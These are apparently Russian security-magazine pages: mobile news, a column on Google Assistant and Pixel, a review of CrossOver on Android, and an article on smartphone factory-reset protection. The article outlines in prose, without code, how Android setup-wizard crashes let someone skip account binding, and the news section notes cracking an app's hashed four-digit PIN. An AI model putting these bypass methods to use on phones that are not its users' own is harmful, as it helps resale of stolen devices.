деле предлагают приложения для защиты информации на SD-карте. Напри-
мер, оказалось, что приложение Private Photo Vault с рейтингом четыре звез-
ды и количеством скачиваний от одного до пяти миллионов защищает файлы
с помощью четырехзначного PIN-кода, который хранится в каталоге приложе-
ния в виде SHA-1-хеша. Имея права root, можно извлечь SHA-1-хеш из прило-
жения и с помощью простейшего скрипта подобрать его за пару секунд.

How the Textsecure Protocol (Signal, WhatsApp, Facebook, Allo) Works — прин-
ципы работы протокола Textsecure, который впервые появился в мессендже-
ре Signal и сегодня используется во многих других популярных мессенджерах.
Статья кратко, но емко описывает применяемые в протоколе криптографиче-
ские алгоритмы, способ обмена ключами, установления соединения, ограни-
чения протокола и его уязвимости.

 Six Reasons You Should Stop Using WhatsApp — шесть причин перестать ис-
пользовать WhatsApp. Спойлер: суть статьи в том, что, несмотря на end-to-end
шифрование для всех чатов, WhatsApp сохраняет историю переписки в облаке
 iCloud или Google Drive в незашифрованном виде и делится метаданными тво-
их сообщений (с кем и когда ты общался) с Facebook.

KNOXout — Bypassing Samsung KNOX (pdf) — исследование системы RKP (Real-
 time Kernel Protection), предназначенной для защиты смартфонов Android от экс-
плоитов ядра. Автор описывает, как работает эта система и как ее обойти.

Pork Explosion Unleashed — рассказ о бэкдоре, найденном в загрузчике неко-
торых произведенных китайской компанией Foxconn (той же, что собирает ай-
фоны) смартфонов. В частности, бэкдор был обнаружен в смартфонах InFocus
M810 и Nextbit Robin и позволяет получить root-доступ без необходимости
даже разблокировать смартфон с помощью PIN-кода. Все, что нужно, — под-
ключение с помощью USB-кабеля.
MOBILE: Колонка Евгения Зобнина
   ALLO,
  GOOGLE
 ASSISTANT
  И PIXEL





                      Евгений Зобнин
                                                    zobnin@gmail.com





В 2012 году Google представила умный голосовой помощник Google Now,
способный не просто выполнять команды пользователя, но и без всякого за-
проса с его стороны показывать контекстно зависимые подсказки: маршрут
до работы при выходе из дома утром, рейсы на самолет, если до этого ты их
искал в Google. Со временем Google Now серьезно поумнел и начал учиты-
вать смысл предыдущих команд для анализа следующих, а в этом году Google
представила Assistant, своего рода серьезно модернизированный Google
Now, способный вести нормальный человеческий диалог, а не только откли-
каться на команды.
  И действительно, по сравнению с Siri и Cortana Google Now выглядел блек-
ло. Он прекрасно справлялся со своей работой, зачастую показывал себя ум-
нее других ассистентов и прекрасно распознавал речь и контекст команды,
позволяя уточнять уже введенные запросы и использовать комплексные ко-
манды. Но чего Google Now действительно не мог — это создать ощущение
беседы с живым существом, которое хоть как-то, криво-косо, не понимая по-
ловину сказанного, но ведет диалог.
   Да, Siri и Cortana тупы и в части «человеческого» общения практически бес-
полезны, поэтому с чисто практической точки зрения подход Google выглядел
абсолютно правильным: нет смысла заставлять двигаться то, что двигаться
не может. Вот только обнаружилось, что человеку на это плевать и он будет
видеть душу даже в самом примитивном собеседнике, а если он действитель-
но одинок и, что самое важное, страдает от этого одиночества, Siri станет его
другом, несмотря на все свои проблемы и фактическое отсутствие человече-
ских черт.
   Оказалось, что люди готовы общаться не только с туповатыми голосовыми
ассистентами, но даже с совсем плоскими ботами Telegram. Для многих боты
стали заменой тяжелых мобильных приложений, а старый, как сами компьюте-
ры, диалоговый интерфейс вдруг превратился в интерфейс будущего, который
медленно, но верно должен эволюционировать в нечто похожее на Саманту
из фильма «Она». Telegram стремительно набирает популярность, Facebook
спешно внедряет поддержку ботов в свой Messenger. Microsoft анонсирует по-
хожую функциональность в Skype.
  На фоне всей этой истерии Google создает помощника с человеческим ли-
цом и выпускает его как часть совершенно нового мессенджера Allo. Это та-
кое комбо в духе игр-файтингов: создать кросс-платформенного конкурен-
та iMessage, Telegram и Facebook Messenger, пропихнуть своего ассистента
на другие платформы и запрыгнуть на подножку поезда, несущегося в мир, на-
селенный роботами, а точнее ботами, которые стали так популярны в послед-
нее время.





                         Google Assistant всегда готов развлечь

Google как бы говорит: тебе не нужен Facebook Messenger или Telegram с его
необходимостью искать ботов и осваивать каждый из них, просто поставь Allo,
и получишь бота, умеющего сразу все. Бот будет спокойно сидеть и просы-
паться тогда, когда тебе это действительно нужно. Если собеседник напишет,
что хочет сходить в кино, бот сразу подскажет ближайшие кинотеатры. Бот
всегда следит за твоими разговорами и готов дать подсказку в любой момент,
основываясь на предмете разговора. Черт возьми, он готов даже отвечать
за тебя, обучаясь твоей манере вести диалог. А если уж совсем не с кем пого-
ворить, то он развлечет тебя забавными беседами, анекдотами и даже сыгра-
ет с тобой в викторину.





                           У него хорошее чувство юмора

В сущности, Google Assistant — это логическое продолжение Google Now
с его способностью давать подсказки тогда, когда они действительно нужны,
Now On Tap, с ее конкретным поиском на основе того, что в данный момент
находится на экране, и технологиями Google, позволяющими подстраивать
продукт под конкретного пользователя. Только работает это все не в одном
Android, но и на iOS, а также везде, куда Google портирует свой мессенджер.
И эта связка, повторюсь, работает из коробки, без необходимости искать бо-
тов, способных выполнить твои задачи, и учиться правильно общаться с ними.





               В нем есть несколько встроенных игр и викторин

Google Assistant способен работать и на уровне системы, вот только похоже,
что доступен он будет исключительно в смартфонах Pixel. И это тоже холодный
расчет. Судя по всему, Google настолько надоело бороться с производителями
смартфонов и пытаться исправить созданную ими плачевную репутацию Android
как дырявой необновляемой платформы, что они решили полностью разделить
понятия «гуглофон» и Android: с одной стороны — тысячи самых разных произ-
водителей аппаратов на базе старых версий Android с собственными извра-
щенными графическими оболочками, а с другой — прекрасный, качественный
смартфон, созданный самой Google. C отличным интерфейсом в стиле Material
Design, встроенным ассистентом, замечательной камерой, безлимитным хра-
нилищем Google Фото, круглосуточной поддержкой по телефону и, конечно же,
быстрыми своевременными обновлениями, которые контролируются не опера-
тором связи и производителем смартфона, а самой Google.





               С ним можно вести диалог и даже признаваться в любви

Если Nexus был именно референсным смартфоном, который должен был за-
давать тренд и ориентировать других производителей смартфонов, а также
разработчиков приложений, то задача Pixel прямо противоположная — пол-
ностью отделить смартфоны Google от всех остальных устройств на базе
Android и перетянуть на себя их пользователей (а возможно, дать пинка и за-
ставить их своевременно выпускать обновления и убрать из прошивок кучу
хлама) и пользователей продукции Apple. Nexus был очень хорошим смартфо-
ном, Pixel должен стать лучшим смартфоном в мире и обязательно превзой-
ти iPhone. В конце концов, не просто так Google устроила отдельную презен-
тацию для Pixel и так долго рассказывала, насколько круче камера их нового
смартфона в сравнении с iPhone 7.





                                                                            Google
                                                                                          Pixel





Получится ли у Google стать передовым производителем смартфонов и обой-
ти Apple, покажет время. Пока, судя по отзывам, компания создала просто
очень неплохой смартфон, который в целом отличный, но не настолько, чтобы
его захотел купить каждый. В будущем Google планирует инвестировать в раз-
работку чипов и получить еще больший контроль над процессом разработки.
Так что в целом она вполне может потягаться за место под солнцем, учитывая
возможность тесной интеграции железа и софта, той самой фишки, о которой
Apple рассказывает на каждой своей презентации.
   Что касается Google Assistant, то он хоть и эксклюзив смартфонов Pixel,
но вполне может быть запущен на любом смартфоне под управлением Android
6.0 и выше. Как и в случае с большинством хаков, для этого нужны права root,
установленный Xposed Installer и модуль Android N-ify.
   Ну и напоследок несколько интересных запросов, которые дадут оценить
возможности Google Assistant:
•  Good Morning
•  Remember my password is 1234
•  Let’s play a game
•  I’m bored
•  Play solitaire
•  Random fun
• Do you know Siri?
MOBILE

ОКНА
ДЛЯ РОБОТА
ЗАПУСКАЕМ НАСТОЛЬНЫЕ ПРИЛОЖЕНИЯ
WINDOWS В ANDROID





                                                                             Денис Погребной
                                                                                               denis2371@gmail.com



Wine, позволяющий запускать приложения для Windows
в Linux и UNIX-системах, существует уже более двадцати
лет. Последние версии Wine справляются с этой задачей
настолько хорошо, что с его помощью можно работать
с большинством популярных приложений и играть почти
во все игры, поддерживающие DirectX 9. Недавно появил-
ся Wine для Android — коммерческая версия CrossOver.
И мимо этого события мы, конечно, не могли пройти.

Wine — это рекурсивный акроним Wine Is Not an Emulator («Wine — не эмуля-
тор»). И это действительно правда: Wine — это альтернативная написанная
с нуля реализация Win32 API. CrossOver — коммерческая версия Wine, ко-
торая предназначена для запуска преимущественно Microsoft Office и игр
для Windows на UNIX-совместимых системах и предоставляет все необходи-
мые для этого оптимизации и настройки совместимости. В CrossOver прило-
жения зачастую работают стабильнее и требуют меньше разбирательств с на-
стройками. Другими словами, CrossOver — это улучшенный Wine. И дорогой:
разработчики просят за него 50 долларов.
  В 2013 году один из разработчиков Wine Александр Жюльяр (Alexandre
Julliard) в рамках саммита Free and Open source Software Developers’ European
Meeting продемонстрировал предварительную версию программного обе-
спечения для мобильной операционной системы Android, дающую возмож-
ность запускать разнообразные Windows-приложения. Портативных устройств
с процессором Intel x86 и Android на борту тогда практически не было, поэтому
проект был интересен исключительно как proof of concept.
   Однако на этом история не закончилась. В октябре 2015 года компания
CodeWaves открыла регистрацию на тестирование CrossOver для Android, куда
я с радостью записался. Релиз планировался на конец 2015 года. Но ни в кон-
це 2015-го, ни в начале 2016 года не было никаких вестей. Бета-версия появи-
лась лишь 25 августа 2016 года и пока доступна только тестировщикам. При-
чем сразу в версии для Android и для устройств с Chrome OS (в которых есть
Play Market).





                                                             CrossOver в Google Play

Итак, в этой статье мы посмотрим, что же собой представляет CrossOver
для Android.
   Характеристики тестового компьютера:

   Процессор: Intel Core i5 4200H
   Видеопроцессор: Intel HD Graphic 4600
   Оперативная память: 8 Гбайт (1600 МГц)
   Диск: SSD ADATA Premier Pro SP920 256 Гбайт (под Android выделено 22 Гбайт)
   ОС: CyanogenMod 13.0 Android x86_64 rc1
    CrossOver: 15.5.0 alpha4

РАБОЧИЙ СТОЛ
Сразу после запуска перед нами предстает рабочий стол с синим фоном. Вни-
зу кнопка «Пуск», в левом верхнем углу красуется надпись CrossOver, а в пра-
вом верхнем — главная кнопка Install Application. После нажатия на нее от-
кроется окно с выбором приложения. Причем в самом списке только четыре
программы: Steam, MS Office 2007 и 2010, WinZip 14.0, что ввергает в уныние.
Но достаточно снять галочку с Only know-good applications, как перед нами
предстанет список из более чем сотни программ и игр.





                                                               Рабочий стол

Многие из них можно установить через кнопку Install, но некоторые все-таки
придется загрузить отдельно. В списке можно найти довольно интересные
игры: Bioshock Infinite, Tomb Raider 2013, Star Wars: Battlefront, World of Tanks,
Dota 2, Batman Arckham City... Из программ есть Adobe Photoshop CS3, Adobe
Acrobat Reader XI, Autocad 2013, Total Commander. По ссылкам находятся те
версии, которые должны обязательно заработать.
  Все программы запускаются в окнах. Но при желании их можно свернуть
в строку задач, как в Windows. Есть и трей, некоторые программы могут туда
сворачиваться и работать в фоне. Количество одновременно запущенных при-
ложений, по всей видимости, ограничивается объемом оперативной памяти
устройства.





                                  Все приложения запускаются в отдельных окнах

Интеграция с ОС Android просто прекрасна. К примеру, можно открыть бра-
узер, запустить в нем ролик YouTube, нажать кнопку «Домой», и воспроиз-
ведение продолжится в фоне. Буфер обмена общий. Можно скопировать
текст в приложении Android и вставить в текстовый редактор, запущенный
в CrossOver.
   Если перейти в «Пуск   Панель управления», то там мы найдем интерес-
ные пункты:
•  Игровые контроллеры. Настройка джойстиков и переключение между ними.
•  Параметры интернета. Настройка домашней страницы для браузера (само-
   го браузера в CrossOver нет, но есть HTML-движок, который могут исполь-
   зовать приложения для показа веб-страниц), управление историей, кешем,
  файлами cookies. Тут же есть управление сертификатами и настройки безо-
   пасности для разных типов интернет-соединений.
•  Установка/удаление программ. Название говорит само за себя.





                                                   Установка и удаление программ

Команда «Пуск   Запустить...» делает то же самое, что нажатие Win + R в са-
мой Windows, то есть открывает строку запуска. Команда regedit откроет ре-
дактор реестра (да, тут есть полноценный реестр), cmd откроет командную
строку (bat-файлы работают), explorer — примитивный файловый менеджер.





                                                          Командная строка





                                                            Редактор реестра

ТЕСТЫ ПРИЛОЖЕНИЙ
•  Steam. CrossOver предлагает его установить сразу после запуска. Работа-
   ет прекрасно, без подвисаний и лагов. Можно посмотреть, загрузить, купить
  любую игру. Какие из них заработают — большой вопрос. Так что придется
   пробовать.
•  Notepad++. Версию x64 установить не получилось. Поддержки x64-про-
   грамм тут нет. А вот версия для Windows x32 встала, как на Windows... Ника-
   ких проблем ни с плагинами, ни с настройками. Только вот на устройствах
   с очень маленьким сенсорным экраном будут серьезные сложности с управ-
   лением.
• SMath Studio. Требует NET Framework 2.0, после установки которой успеш-
   но запускается, хоть и имеет проблемы с графикой: не отображаются мате-
   матические знаки и сетка. Но все вычисления можно выполнять.
•  Total Commander. Версию с официального сайта запустить не удалось.
  А вот версия из репозитория CrossOver (к сожалению, это не самая свежая
   8.52а) заработала прекрасно.
• GPU-Z и CPU-Z не заработали.
•  AIDA64 выдала ошибку при установке.
•  CCleaner. Версию с сайта (5.36) установить не удалось, но из репозитория
   прекрасно встала версия 3.16.166 (она там единственная) и даже нашла ко-
   е-какой мусор.
•  Firefox версии 47.02 прекрасно работал, однако после обновления до 49-й
   версии перестал запускаться.
•  LibreOffice. Последняя версия с официально сайта установилась и зара-
   ботала без каких-либо проблем.





                                                        SMath Studio

Официально заявлена поддержка MS Office 2010. А в репозитории можно най-
ти даже версию 2013 года (основываясь на опыте, скажу, что 2016-й офис вряд
ли заработает). Также пока что не заработает Mathcad, Wolfram Mathematica
и другие сложные и сильно интегрированные в систему приложения.





                                                                                  LibreOffice

WOT Blitz из Steam запустить не удалось, хотя нативная версия игры для Android
работала прекрасно. Установщик десктопной версии World Of Tanks тоже
не удалось запустить. А версия, предлагаемая для установки самим CrossOver,
предназначена для европейского сервера. Кстати, даже в ней мне не удалось
найти в инсталляторе кнопку «Установка».





                                                                            CCleaner
НАСТРОЙКИ
Открыть настройки можно, если последовательно кликнуть на «Пуск    Builtin
Tools    Wine Configuration». Тут все точно так же, как в стандартном Wine
для Linux:
•  Приложения. Здесь можно выбрать версию ОС Windows, которую
   CrossOver передаст приложению для своей идентификации. Выбор досту-
   пен как для каждого приложения по отдельности, так и для всех сразу. По-
   ставить можно все версии от Windows 2.0 до Windows 10! По умолчанию
   установлена Windows XP. После переключения на Windows 10 перестал
   работать Steam. Других изменений замечено не было. Настройки версии
   Windows можно применять отдельно для каждого приложения.
•  Библиотеки. Настройки стандартных DLL-библиотек Windows. Для каждой
   библиотеки доступен выбор из двух версий «Встроенная (Wine)» и «Сторон-
   няя (Windows)». Смысл здесь в том, что встроенные библиотеки Wine не-
   редко реализованы не полностью и могут быть несовместимы с некоторыми
   приложениями. В этом случае можно скачать родную библиотеку Wine, по-
   ложить ее в виртуальную папку C:\windows и выбрать эту библиотеку как сто-
   роннюю. Узнать о том, какие библиотеки могут требовать те или иные при-
   ложения и игры, можно в базе совместимых приложений Wine.
•  Графика. Тут есть настройки шрифта, перехвата мыши окнами, а также не-
   которые другие параметры графики.
• Вид и интеграция. Тут есть настройки тем (правда, во встроенном катало-
   ге тем вообще нет). А еще тут можно самостоятельно настроить множество
   параметров, например цвет рабочего стола, рамки окна, шрифт. Фактически
   это инструмент для создания собственных тем. Также тут можно поменять
   папки, используемые для документов, музыки, картинок, видео. По умолча-
  нию они очень интересно интегрированы с Android-окружением. Даже ме-
   нять не хочется.
•  Диски. Создание и редактирование виртуальных дисков. По умолчанию есть
   диск C (системный, находится где-то внутри самого приложения) и диск Z,
   который ссылается на корневой каталог (/). Так что, если необходимо уста-
   новить приложение с карты памяти, нужно открывать папку Z:\sdcard.
•  Аудио. Настройка устройств ввода и вывода звука и проверка их работы.





                                                          Настройки графики

Также в меню Builtin Tools можно найти:
• Command Shell — командная строка. Правда, в ней нет почти никаких функ-
   ций;
•  Notepad — блокнот из Windows;
•  File Explorer — примитивный файловый менеджер.





                                                     Файловый менеджер

ПРОБЛЕМЫ
•  Запуск CrossOver возможен только на процессорах x86. Так что даже самые
  мощные устройства на ARM в пролете.
•  Нет поддержки x64-программ, несмотря на то что версия Android для x64-про-
   цессоров существует.
•  Отсутствует поддержка полноэкранного режима для всех приложений (не-
   известно, как убрать строку с названием CrossOver и пунктом перехода в ре-
   позиторий приложений).
•  Поддержка только DirectX 9. В ближайшем будущем разработчики обещают
   добавить поддержку DirectX 10 и 11. А вот DirectX 12 вряд ли вообще будет
   доступен в ближайшие годы.
• Объем памяти — тот же MS Office занимает около 3 Гбайт на диске. А если
   поставить Adobe Photoshop, Audition, Mathcad, то места останется слишком
   мало. Даже в аппарате с 32 Гбайт памяти.
•  Большинство программ, доступных через каталог CrossOver, на английском
   языке и/или представляют собой европейские версии без русской локали-
   зации, привязанные к евросерверам.
•  Нет диспетчера задач. Это несколько затрудняет управление процессами.
•  Эмуляции джойстика, как, к примеру, на эмуляторах игровых приставок, нет.
   Так что на устройствах с сенсорным экраном без джойстика вряд ли полу-
   чится во что-то поиграть.
•  Многооконный режим работает только в пределах CrossOver. Так что опти-
   мизации для Remix OS и Chrome OS пока еще нет.

ЗАКЛЮЧЕНИЕ
Проект Wine для Android сейчас, к сожалению, вряд ли сможет заменить
устройства на базе десктопной Windows. Но некоторые полезные и интерес-
ные приложения запустить получится. Проект все еще в стадии закрытого бе-
та-теста, так что к релизу, я думаю, многие недочеты будут устранены, а список
работающих программ расширится в несколько раз. Также можно надеяться,
что в релиз войдет поддержка DirectX 10/11 и Vulkan API.
   Омрачает картину только то, что на мобильном устройстве от десктопных
приложений не так уж и много толку. А играть в игры получится только при на-
личии джойстика или мыши с клавиатурой. Еще больше масла в огонь подлила
компания Intel, когда ушла с рынка смартфонов.
   MOBILE
«ВВЕДИТЕ ПАРОЛЬ
 СВОЕГО АККАУНТА»
   КАК ВЗЛАМЫВАЮТ ЗАЩИТУ СМАРТФОНОВ
   ОТ СБРОСА К ЗАВОДСКИМ НАСТРОЙКАМ





             Олег Афонин,
            Эксперт по мобильной
          криминалистике компании
                Элкомсофт
            aoleg@voicecallcentral.com




    Воровство смартфонов — большая проблема. Ее мас-
   штабы настолько велики, что правительства многих госу-
    дарств и межгосударственных образований приняли ряд
    законов, направленных на радикальное снижение привле-
    кательности телефонов в глазах воров. Так в смартфонах
    появились механизм kill switch для удаленной блокировки
    и уничтожения данных, а позже привязка смартфона к ак-
    каунту пользователя, которая должна сделать кражу бес-
    смысленной. Но насколько на самом деле эффективны
    эти меры и легко ли их обойти?

     Первый закон, направленный на защиту пользовательских данных, был при-
      нят в штате Калифорния в 2014 году. В законе прописано новое требование
     ко всем производителям смартфонов, желающим продавать свои устройства
     на территории штата. Согласно этому требованию, с 1 июля 2015 года про-
     изводители обязаны встраивать так называемый kill switch, который позволит
     владельцу дистанционно заблокировать телефон или уничтожить данные.
        Здесь нужно отметить, что удаленное уничтожение данных уже применя-
     лось на практике такими производителями, как Apple (функция Find My iPhone),
      BlackBerry (Protect) и Android (через Android Device Manager). Фактически за-
     кон сделал применение и активацию этих функций обязательными. В частно-
      сти, подтянулись смартфоны Microsoft: теперь во всех новых устройствах, про-
     даваемых на территории США, есть пункт Find My Phone.
       Однако быстро выяснилось, что воришкам совершенно неинтересны дан-
     ные пользователя, которые и уничтожаются дистанционной командой. Все,
      что требовалось вору, — это как можно скорее сбросить телефон к заводским
     настройкам, после чего настроить его для работы с новой учетной записью
     или без нее.
        Производители попытались усовершенствовать существующую систему,
     добавив привязку устройств к учетной записи пользователя и защиту, которая
     не позволяла бы обходить такую привязку. Согласно статистике, эти меры сра-
      ботали: после их повсеместного введения кражи смартфонов уменьшились
     на весьма заметные 40%. Насколько на самом деле эффективны эти меры
     и как их обойти — тема сегодняшней статьи.

    APPLE IOS
      •  Защита от сброса к заводским настройкам: да, на всех относительно совре-
       менных устройствах
      •  Удаленная блокировка: начиная с iOS 4.2 (ноябрь 2010 года)
      •  Дата появления защиты от сброса: iOS 6 (сентябрь 2012 года)
      •  География: по всему миру
      •  Защита от понижения версии прошивки: да, и отлично работает
      •  Для снятия защиты: разблокировать устройство (требуется PIN или отпеча-
         ток пальца), отключить Find My iPhone (требуется пароль к Apple ID)
      •  Актуальный статус: защита работает

     iOS — закрытая система, код которой полностью контролируется Apple. Во
     всех относительно свежих версиях iOS (а это порядка 98% устройств на ру-
      ках у пользователей) обойти момент активации устройства нельзя. Актива-
     ция iPhone невозможна без «отмашки» со стороны сервера, контролируемого
      Apple. Соответственно, если устройство привязано к определенной учетной
      записи, то эту привязку никак не обойти без доступа к серверу — по крайней
     мере, в теории.
        Функция удаленной блокировки активна по умолчанию. Управление этой
     функцией доступно в меню iCloud   Find My iPhone:





     Что произойдет, если телефон с активированной функцией Find My iPhone
     будет украден? Даже если злоумышленник моментально выключит телефон,
     после чего сбросит его к заводским настройкам или перепрошьет начисто
      (никакой проблемы — через iTunes это делается элементарно), то первое,
      что он увидит при включении, — это мастер активации. Телефон нужно будет
      активировать, для чего обязательно подключиться к интернету. Как только те-
     лефон устанавливает соединение с сервером Apple, мастер активации запро-
      сит пароль от того Apple ID, который был использован до аппаратного сброса.
      В старых версиях iOS (до версии iOS 6) существовала возможность обой-
      ти активацию. Но где ты видел iPhone с iOS 6? В руки среднестатистического
     воришки такой, скорее всего, не попадет никогда, а если и попадет — его ма-
     териальная ценность стремится к нулю. Откатиться на старую версию iOS тоже
     не получится: для современных устройств уязвимых версий просто не суще-
      ствует в природе, а для старых сработает весьма эффективная защита от по-
     нижения версии системы. Впрочем, даже обход активации на уязвимых вер-
      сиях iOS не позволял пользоваться устройством как телефоном; фактически
     вместо iPhone получался iPod Touch.
       А если ты просто собираешься продать надоевший телефон и не хочешь,
     чтобы у покупателя возникли проблемы? Тут все просто, но сделать это тебе
     придется до того, как ты сбросишь устройство к заводским настройкам.
       1. Разблокируй телефон (датчиком отпечатков или паролем).
       2. Отключи Find My iPhone в настройках iCloud.
       3. Введи пароль от Apple ID.

     Все, можно сбрасывать. Защита отключена. А вот злоумышленнику отключить
     защиту не удастся. Для этого ему придется преодолеть два уровня защиты:
     блокировку экрана и пароль от Apple ID.
       Защита от сброса и неавторизованной активации в смартфонах Apple
     прекрасно работает по всему миру. Обойти ее программными способами
     не представляется возможным. Забыл пароль от Apple ID или удалил учетную
     запись? Иди в Apple Store или звони в поддержку, готовься предъявить чек или
     иные доказательства легитимности владения устройством. Поскольку защита
      активируется на стороне сервера, при предъявлении таких доказательств со-
     трудники Apple могут помочь.
        Существуют аппаратные способы обхода защиты. Для очень старых
      устройств достаточно было перепаять единственный конденсатор. Для со-
     временных требуется разборка, прямой доступ к микросхеме памяти и руч-
     ная работа программатором для смены идентификатора устройства. После
     смены идентификатора устройство может пройти активацию, но нет ни ма-
     лейшей гарантии, что оно продолжит это делать после обновления системы.
    В любом случае такой способ обхода слишком сложен для обычного воришки,
      так что с iPhone стараются не связываться — продать украденное устройство
     можно будет разве что на запчасти.

    ANDROID
      •  Защита от сброса к заводским настройкам: на части устройств (если уста-
        новлен Android 5.1 или выше, при этом устройство было выпущено с завод-
        ской прошивкой на Android 5.0 или выше) через Google Services
      •  Удаленная блокировка: опционально через Android Device Manager (декабрь
       2013 года), все версии Android 2.2 и выше
      •  Дата появления защиты от сброса: Android 5.1 (февраль 2015 года)
      •  География: по всему миру, кроме Китая
      •  Защита от понижения версии прошивки: в зависимости от производителя
        и модели устройства; чаще не работает, чем работает
      •  Для снятия защиты: разблокировать устройство, удалить Google Account
        (пароль не требуется)
      •  Актуальный статус: на большинстве устройств обходится без особых про-
       блем

     Давай договоримся: мы сейчас ведем речь исключительно об устройствах
     с Google Android, то есть с установленными «из коробки» сервисами GMS. Ав-
     тор в курсе существования Mi Protect и подобных систем в китайских смарт-
     фонах и умеет их обходить. С незаблокированным загрузчиком это настолько
      просто, что не представляет никакого интереса (и нет, никакого ответа от сер-
     вера Xiaomi в случае с Mi Protect совершенно не требуется).
         Итак,  возможность  удаленно  сбросить  или  заблокировать  телефон
     в Android появилась давно, в конце 2013 года. Причем, что интересно, воз-
     можность эта не привязана к конкретной версии операционной системы (ко-
     торая может быть как старой, так и очень старой без шансов на обновление),
     а обеспечивается механизмами Google Mobile Services (GMS) и приложением
      Android Device Manager.
       А вот защита от сброса к заводским настройкам и последующей актива-
     ции появилась совсем недавно — в феврале 2015 года в Android 5.1 (который,
      к слову сказать, так никогда и не получила почти половина активных на насто-
     ящий момент устройств под управлением Android). Однако и здесь не обо-
     шлось без подвоха: защита работает только на тех устройствах, которые были
     выпущены с Android 5.0 или более новой версией на борту.
       Не нужно удивляться, если твое устройство работает под управлением
      Android 5.1 или 6.0 и не обладает такой защитой. Как и многие другие возмож-
     ности Android, эта оставлена на усмотрение производителя, так что те могут
      включать, а могут и не включать ее в свои устройства. Впрочем, производите-
     ли первого и второго эшелонов в устройствах 2015 и 2016 модельных годов
      эту возможность, как правило, активировали. А вот к китайским смартфонам
      это не относится совершенно: отсутствие GMS в Китае и вытекающее из этого
      отсутствие требований по сертификации устройств приводит к повсеместному
     наплевательскому отношению к безопасности.
       Важный момент: если загрузчик в устройстве не заблокирован или может
     быть разблокирован, то любые защиты обходятся в несколько движений. Этот
      путь мы даже рассматривать не станем, неинтересно. Интереснее обстоят
     дела с моделями, загрузчик в которых заблокирован и не может быть разбло-
     кирован штатными средствами.
       Для начала разберемся, при каких обстоятельствах срабатывает защита.
     Сразу отмечу, что никакой специфической опции в настройках нет: защита ак-
      тивируется сама собой при совпадении некоторых условий. Итак, если у тебя
     телефон под управлением Android 5.1 или 6, то защита от сброса активируется
     автоматически при следующих обстоятельствах:
       1. Пользователь установил безопасную блокировку экрана (PIN, пароль или
         паттерн).
       2. На устройстве добавлен хотя бы один Google Account.

     Как только выполняется последнее из двух условий, автоматически активиру-
      ется защита от аппаратного сброса. Для ее отключения недостаточно убрать
      PIN-код с блокировки экрана. При отключении PIN-кода ты увидишь грозное
     сообщение о деактивации защиты, но на деле этого не происходит! Для того
     чтобы защиту снять, необходимо удалить все учетные записи Google из на-
     стройки Settings   Accounts.
        Если же этого не сделать, то вот что ты увидишь при попытке настроить
     устройство после сброса:





     Тебе придется зайти в устройство именно с той учетной записью, которая была
      активна перед сбросом. Более того, если у тебя была настроена двухфактор-
     ная аутентификация, то тебе придется откуда-то брать еще и одноразовый
     код — задача для простого пользователя нетривиальная, если он не озабо-
      тился настроить приложение Google Authenticator на другом устройстве.
       Перед тем как перейти к взлому описанной выше схемы, отметим несколь-
     ко неочевидных вещей.
        Во-первых, в Google предусмотрели интересную дополнительную меру
     противодействия воровству. Если ты сменишь пароль от своей учетной запи-
      си, то не сможешь активировать устройство после аппаратного сброса в те-
     чение 24 часов с момента смены пароля. Еще несколько месяцев назад тебе
     пришлось бы ждать 72 часа, но уж слишком много жалоб поступало в Google
      от рассерженных пользователей.
      И второе. Я уже писал, что Google Device Protection (именно так это называ-
      ется официально) не работает в случае с разблокированным загрузчиком. Со-
      ответственно, включение возможности OEM unlocking в настройках Developer
      Setting должно, казалось бы, приводить к деактивации защиты. И действитель-
      но, мы можем наблюдать вот такое сообщение:





     Однако на деле защита от аппаратного сброса не деактивируется, равно
      как она не деактивируется при снятии PIN-кода блокировки экрана. Един-
     ственный способ отключить защиту — удалить все учетные записи Google
     из Settings — Accounts.
      С этим разобрались. А теперь посмотрим, каким образом защиту можно
      обойти.
        Оказывается, обойти не просто, а очень просто. Оставим сейчас за бор-
     том возможность понижения версии прошивки до Android 5.0 или более ста-
      рой: в конце концов, такая возможность (равно как и такая прошивка) есть
     не для каждого устройства.
        Все, что нужно для обхода блокировки, — это обойти мастер активации
      устройства. Если нам удастся попасть на домашний экран — ни о каких бло-
     кировках и речи не будет. Все работающие способы направлены как раз на то,
     чтобы инициировать аварийное завершение приложения активации. Один
     из способов, прекрасно срабатывающих на устройствах Samsung, — запуск
     приложения Setup Wizard с внешней флешки, подключенной к телефону че-
     рез кабель OTG. Дело в том, что телефоны Samsung автоматически запускают
     в таких случаях встроенный Samsung File Explorer.
        Другой способ, срабатывающий одинаково хорошо на устройствах под
     управлением Android 5.1 и 6.0 любого производителя, можно посмотреть
     на YouTube. Как отмечают авторы статьи с Android Central, «обойти такую защи-
      ту сможет даже семилетний ребенок».
        Здесь важно отметить, что с очередным патчем безопасности брешь могли
     и прикрыть, но получил ли ее конкретный телефон — заранее никогда не из-
      вестно.
        Другой способ посложнее, но срабатывает даже на устройствах с июль-
     ским патчем безопасности. На устройствах LG все еще проще. А вот так обхо-
     дится защита на новеньких (и очень привлекательных для воришек) Samsung
      Galaxy S7 и S7 Edge.
       Идея здесь в любом случае одна: любым способом попасть на главный
     экран устройства, получить доступ к меню настроек или возможность запуска
     любого стороннего APK. Для этого используются самые разнообразные ошиб-
      ки в мастере активации: и неожиданное отключение Wi-Fi уже после настройки
      сети, и переполнение буфера, и автоматический запуск сторонних приложе-
     ний при выполнении определенных действий (к примеру, подключение флешки
     через OTG). Стоит получить доступ к главному экрану, как появляется возмож-
     ность запустить модифицированную программу начальной настройки телефо-
      на, с помощью которой в устройство добавляется любая учетная запись — не-
     обязательно та, к которой телефон был изначально привязан.

    WINDOWS PHONE 8.1 И WINDOWS 10 MOBILE
      •  Защита от сброса к заводским настройкам: на части устройств (устройства,
        предназначенные для американского рынка, работающие под управлением
        Windows Phone 8.1 GDR2 и Windows 10 Mobile)
      •  Удаленная блокировка: опционально через Find My Phone (WP8 и новее)
      •  Дата появления защиты от сброса: Windows Phone 8.1 Update 2 build
        8.10.15127.138 (февраль 2015 года)
      •  География: только США
      •  Защита от понижения версии прошивки: есть
      •  Для снятия защиты:
        • Windows Phone 8.1: разблокировать устройство, About   Reset your phone,
         ввести пароль от Microsoft Account
        • Windows 10 Mobile: разблокировать устройство, отключить Find My Phone
            Reset Protection, ввести пароль от Microsoft Account
        • Через веб: зайти в учетную запись Microsoft Account на account.microsoft.
          com/devices, нажать I don’t own this phone anymore, сохранить показанный
          recovery key и использовать ключ для разблокировки телефона
      •  Проверить   статус   блокировки:   https://account.microsoft.com/devices/
          resetprotection
      •  Актуальный статус: защита действенна; подробных исследований не прово-
        дилось из-за малого распространения платформы

